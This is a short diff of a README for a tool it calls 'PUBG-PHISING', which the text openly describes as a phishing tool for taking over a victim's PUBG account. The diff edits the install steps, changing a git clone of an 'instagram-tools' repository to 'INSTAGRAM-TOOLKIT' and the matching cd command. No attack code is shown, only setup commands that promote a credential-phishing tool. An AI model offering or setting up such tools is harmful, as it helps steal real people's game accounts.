@@ -83,9 +83,9 @@ PUBG-PHISING IS A PHISING TOOL WICH IS USED TO PHISH A PUBG ACCOUNT OF YOUR VICT
 
 * `pkg install curl`
 
-* `git clone https://github.com/WHITE-HAT786/instagram-tools.git`
+* `git clone https://github.com/WHITE-HAT786/INSTAGRAM-TOOLKIT.git`
 
-* `cd instagram-tools`
+* `cd INSTAGRAM-TOOLKIT`
 
 * `ls`
 
